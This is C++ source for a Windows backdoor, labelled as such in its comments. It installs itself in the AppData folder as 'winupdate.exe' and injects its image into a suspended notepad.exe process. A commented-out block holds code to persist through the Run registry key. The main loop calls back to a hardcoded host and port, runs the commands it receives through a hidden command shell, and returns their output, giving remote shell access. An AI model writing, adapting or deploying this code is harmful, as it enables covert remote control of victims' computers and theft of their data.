#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <stdexcept>
#include <array>
#include <filesystem>
#include <codecvt>
#include <vector>
#include <stdio.h>
#include <fstream>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "ntdll.lib")

using namespace std;
namespace fs = std::filesystem;

const char* HOST = "127.0.0.1";
const int PORT = 65000;
const string NOTEPAD_PATH = R"(C:\Windows\System32\notepad.exe)";

string install_path = string(getenv("APPDATA")) + "\\WinUpdate";
typedef NTSTATUS(WINAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

BOOL UnmapTargetSection(HANDLE hProcess, PVOID baseAddress) {
    HMODULE hNtdll = GetModuleHandle("ntdll.dll");
    if (!hNtdll) return FALSE;

    auto NtUnmapViewOfSection =
            (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    if (!NtUnmapViewOfSection) return FALSE;

    NTSTATUS status = NtUnmapViewOfSection(hProcess, baseAddress);
    return status == 0; // STATUS_SUCCESS == 0
}

/**
 * Function install : create the directory for the backdoor file and installs it there
 *
 * @param filename
 *
 */
void install(const char * filename) {
    fs::create_directory(install_path);

    fs::path executablePath = absolute(fs::path(filename));
    string installTarget = install_path + "\\winupdate.exe";

    try {
        copy_file(executablePath, installTarget);
    }
    catch (std::exception &e) {
        cout << e.what();
    }
}

LPVOID get_base_address(DWORD pid) {
    HANDLE process_h = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!process_h) return nullptr;

    HMODULE h_mod;
    DWORD cb_needed;
    if (EnumProcessModules(process_h, &h_mod, sizeof(h_mod), &cb_needed )) {
        CloseHandle(process_h);
        return h_mod;
    }

    CloseHandle(process_h);
    return nullptr;
}


/**
 * Function launch_process : launch the backdoor in background mode
 *
 */
void launch_process() {
    // Ouvrir le fichier exécutable (winupdate.exe)
    std::ifstream exe_file(install_path + "\\winupdate.exe", std::ios::binary | std::ios::ate);
    if (!exe_file.is_open()) {
        std::cerr << "Erreur lors de l'ouverture de l'exécutable." << std::endl;
        return;
    }

    std::streamsize size = exe_file.tellg();
    exe_file.seekg(0, std::ios::beg);

    // Allouer un buffer pour stocker l'exécutable
    char* buffer = new char[size];
    if (!exe_file.read(buffer, size)) {
        std::cerr << "Erreur lors de la lecture du fichier." << std::endl;
        delete[] buffer;
        return;
    }

    // Initialisation des paramètres pour le nouveau processus
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Création du processus légitime (notepad.exe)
    std::vector<char> notepad_vec(NOTEPAD_PATH.begin(), NOTEPAD_PATH.end());
    notepad_vec.push_back('\0');  // S'assurer que la chaîne est bien terminée par un null

    if (!CreateProcess(nullptr,
                       notepad_vec.data(),
                       nullptr,
                       nullptr,
                       FALSE,
                       CREATE_SUSPENDED,
                       nullptr,
                       install_path.c_str(),
                       &si,
                       &pi)) {
        std::cerr << "Erreur lors de la création du processus. Code d'erreur : " << GetLastError() << std::endl;
        delete[] buffer;
        return;
    }

    // Si la création du processus réussie, nous obtenons son PID
    std::cout << "Processus créé avec PID : " << pi.dwProcessId << std::endl;

    // Allouer de la mémoire dans le processus cible pour l'exécutable
    LPVOID remote_mem = VirtualAllocEx(pi.hProcess, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_mem) {
        std::cerr << "VirtualAllocEx a échoué. Code d'erreur : " << GetLastError() << std::endl;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        delete[] buffer;
        return;
    }

    // Écrire l'exécutable dans la mémoire allouée du processus cible
    if (!WriteProcessMemory(pi.hProcess, remote_mem, buffer, size, nullptr)) {
        std::cerr << "WriteProcessMemory a échoué. Code d'erreur : " << GetLastError() << std::endl;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        delete[] buffer;
        return;
    }

    // Créer un thread distant pour exécuter le code injecté
    HANDLE hThread = CreateRemoteThread(pi.hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remote_mem, nullptr, 0, nullptr);
    if (hThread == NULL) {
        DWORD error_code = GetLastError();
        std::cerr << "Échec de la création du thread distant. Code d'erreur : " << error_code << std::endl;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        delete[] buffer;
        return;
    }

    // Reprendre l'exécution du processus légitime
    if (ResumeThread(pi.hThread) == -1) {
        std::cerr << "Erreur lors de la reprise du thread. Code d'erreur : " << GetLastError() << std::endl;
        CloseHandle(hThread);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        delete[] buffer;
        return;
    }

    // Attendre que le thread distant termine
    WaitForSingleObject(hThread, INFINITE);

    // Fermer les handles ouverts
    CloseHandle(hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    delete[] buffer;

    // Conversion to a vector (mutable)
    /*vector<char> cmdVec(install_path.begin(), install_path.end());
    cmdVec.push_back('\0');

    // Creation of the new process
    CreateProcess(
            nullptr,
            cmdVec.data(),
            nullptr,
            nullptr,
            FALSE,
            0, //A new console for this process will be created
            nullptr,
            install_path.c_str(), // Startup directory
            &si,
            &pi
    );*/
}


/**
 * Function add_to_startup : add the backdoor to the windows files that get launched on startup (so it will be persistent)
 *
 */
void add_to_startup() {

    // Gets the path of the backdoor
    char *app_data_path = std::getenv("APPDATA");
    install_path = string(app_data_path) + "\\WinUpdate\\winupdate.exe";
    wstring widestr(install_path.begin(), install_path.end());
    const wchar_t *executable_path = widestr.c_str();

    // Add it to Windows register keys
    HKEY hkey;
    RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey);
    RegSetValueExW(hkey, L"winupdate", 0, REG_SZ, LPBYTE(executable_path), sizeof(executable_path) * wcslen(executable_path));
    RegCloseKey(hkey);
}

/**
 * Function called to execute a system command and return the output
 *
 */
string exec(const char * cmd) {

    // Creation of the command
    const char *cmd_path = (getenv("COMSPEC"));
    wstring_convert<std::codecvt_utf8<wchar_t>> converter;
    wstring wideString = converter.from_bytes(cmd);
    wstring wCmdPath = converter.from_bytes(cmd_path);
    wstring full_cmd = wCmdPath + L" /c " + wideString;
    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = nullptr;

    HANDLE hReadPipe = nullptr, hWritePipe = nullptr;

    // Creation of the pipe to read the output
    CreatePipe(
            &hReadPipe,
            &hWritePipe,
            &saAttr,
            0);
    string output;

    STARTUPINFOW si = {};
    si.cb = sizeof(STARTUPINFOW);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES,
    si.wShowWindow = SW_HIDE;
    si.hStdInput = INVALID_HANDLE_VALUE,
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;

    PROCESS_INFORMATION pi = {};
    CreateProcessW(nullptr, (LPWSTR)full_cmd.c_str(), nullptr,
                   nullptr, TRUE, CREATE_NEW_CONSOLE, nullptr,
                   nullptr, &si, &pi);

    // Wait for the end of the child
    bool bProcessEnded = false;
    int counter = 0;
    while (!bProcessEnded && counter<100)
    {

        // Give some sleep (50 ms), so we won't waste 100% CPU.
        bProcessEnded = WaitForSingleObject( pi.hProcess, 50) == WAIT_OBJECT_0;
        counter++;

        // Even if process exited - we continue reading, if
        // there is some data available over pipe.
        for (;;)
        {
            char buf[1024];
            DWORD dwRead = 0;
            DWORD dwAvail = 0;

            if (!::PeekNamedPipe(hReadPipe, nullptr, 0, nullptr,
                                 &dwAvail, nullptr))
                break;

            if (!dwAvail) // No data available, return
                break;

            if (!::ReadFile(hReadPipe, buf, sizeof(buf) - 1, &dwRead,
                            nullptr) || !dwRead)
                // Error, the child process might end
                break;

            buf[dwRead] = 0;
            output += buf;
        }
    }

    // Close all pipes
    CloseHandle(hReadPipe);
    CloseHandle(hWritePipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return output;
}


/**
 * Function cmd : execute a given command and send the output to the socket
 *
 * @param sock is the socket the result will be sent to
 *
 */
void cmd(SOCKET sock) {
    char command[1024];
    string output;
    std::filesystem::path cwd;
    char cwd_char[1024];

    while (true) {
        cwd = fs::current_path();
        strcpy_s(cwd_char, cwd.string().c_str());
        send(sock, cwd_char, sizeof(cwd_char), 0);
        int bytesRead = recv(sock, command, sizeof(command), 0);
        if (bytesRead > 0) {
            command[bytesRead] = '\0';
            if (string(command)=="exit") break;
            else if (string(command).substr(0, 2)=="cd") {
                try {
                    cwd = string(command).substr(3, string(command).length() - 3);
                    fs::current_path(cwd);
                }
                catch (...) {
                    output = "The specified path is not correct or doesn't exist!";
                    send(sock, output.c_str(), output.size() + 1, 0);
                    Sleep(10);
                }
                string end = "END";
                send(sock, end.c_str(), end.size() + 1, 0);
            }
            else {
                output = exec(command);
                size_t positionDebut = 0;

                while (positionDebut < output.length()) {
                    std::string morceau = output.substr(positionDebut, 2048);
                    const char *buffer = morceau.c_str();
                    send(sock, buffer, strlen(buffer), 0);
                    positionDebut += 2048;
                    Sleep(100);
                }
                string end = "END";
                send(sock, end.c_str(), end.size() + 1, 0);
            }
        }
        else {
            return;
        }
    }
}

int main() {
    const char *systemRoot = std::getenv("SystemRoot");
    std::string system32Path = std::string(systemRoot) + "\\System32";
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
    char *AppDataPath = std::getenv("APPDATA");
    string InstallPath = string(AppDataPath) + "\\WinUpdate";

    if (strcmp(__argv[0], NOTEPAD_PATH.c_str()) != 0) {
        install(__argv[0]);
        launch_process();
        cout << "On lance le prog" << endl;
        cin.get();
        return 1;
    }
    else {
        cout << "Notepad installation" << endl;
    }
    /*if (!fs::exists(InstallPath) && !fs::is_directory(InstallPath)) {
        install(__argv[0]);
        add_to_startup();

        return 0;
    }
    if (fs::current_path().string()!=InstallPath && fs::current_path().string()!=system32Path) {
        launch_process();
        return 0;
    }*/

    // Initialization of Winsock
    while (true) {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "Error while initialization of winsock." << std::endl;
            return 1;
        }
        SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "Error while creating the client's socket." << std::endl;
            WSACleanup();
            return 1;
        }

        DWORD timeout = 300000;
        setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof timeout);

        // Definition of server information
        sockaddr_in serverAddress{};
        serverAddress.sin_family = AF_INET;
        serverAddress.sin_addr.s_addr = inet_addr(HOST);
        serverAddress.sin_port = htons(PORT);

        // Connection to the server
        if (connect(clientSocket, (struct sockaddr *) &serverAddress, sizeof(serverAddress)) != SOCKET_ERROR) {
            cmd(clientSocket);
        }

        closesocket(clientSocket);
        WSACleanup();
        Sleep(10000);
    }
}